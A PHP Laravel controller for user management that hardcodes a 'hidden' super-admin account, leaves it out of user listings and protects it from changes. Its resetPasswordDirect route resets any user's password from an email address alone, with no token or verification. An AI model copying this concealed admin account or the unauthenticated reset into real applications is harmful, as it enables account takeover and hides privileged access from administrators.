<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\ValidationException;

class UserController extends Controller
{
    // Hidden Development/Super Admin email
    private $superAdminEmail = 'admin@theanzwer.com';

    /**
     * Display a listing of users, excluding the hidden super admin.
     */
    public function index()
    {
        return User::where('email', '!=', $this->superAdminEmail)->get();
    }

    /**
     * Store a newly created user in storage.
     */
    public function store(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|string|max:255|unique:users',
            'password' => 'required|string|min:8|confirmed', // Enabled password confirmation
        ]);

        return User::create([
            'name' => $request->name,
            'email' => $request->email,
            'password' => Hash::make($request->password),
            'status' => 1,
        ]);
    }

    /**
     * Update the specified user in storage.
     */
    public function update(Request $request, User $user)
    {
        // Prevent any actions on the hidden super admin account
        if ($user->email === $this->superAdminEmail) {
            return response()->json(['message' => 'Unauthorized access'], 403);
        }

        $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|string|max:255|unique:users,email,' . $user->id,
            'current_password' => 'required', // Current password is mandatory for any update
        ]);

        // Verify current password before proceeding
        if (!Hash::check($request->current_password, $user->password)) {
            throw ValidationException::withMessages([
                'current_password' => ['The provided current password does not match our records.'],
            ]);
        }

        $user->name = $request->name;
        $user->email = $request->email;

        // Update password only if provided and confirmed
        if ($request->password) {
            $request->validate([
                'password' => 'required|string|min:8|confirmed',
            ]);
            $user->password = Hash::make($request->password);
        }

        $user->save();
        return response()->json($user);
    }

    /**
     * Remove the specified user from storage.
     */
    public function destroy(User $user)
    {
        if ($user->email === $this->superAdminEmail) {
            return response()->json(['message' => 'Unauthorized'], 403);
        }

        $user->delete();
        return response()->json(['message' => 'User account deleted successfully']);
    }

    /**
     * Toggle user active/disabled status.
     */
    public function updateStatus(Request $request, $id)
    {
        $user = User::findOrFail($id);
        
        // Safety check for super admin status
        if ($user->email === $this->superAdminEmail) {
            return response()->json(['message' => 'Unauthorized'], 403);
        }

        $user->status = $request->status;
        $user->save();

        return response()->json(['message' => 'User status updated successfully']);
    }

    /**
     * Directly reset user password via email (Forgot Password feature).
     * No current password required for this specific recovery route.
     */
    public function resetPasswordDirect(Request $request)
    {
        $request->validate([
            'email' => 'required|exists:users,email',
            'password' => 'required|string|min:8|confirmed',
        ]);

        $user = User::where('email', $request->email)->first();

        // Safety check: Cannot reset Super Admin via this route
        if ($user->email === $this->superAdminEmail) {
            return response()->json(['message' => 'Security restriction: Contact Developer'], 403);
        }

        $user->password = Hash::make($request->password);
        $user->save();

        return response()->json(['message' => 'Password reset successfully!']);
    }
}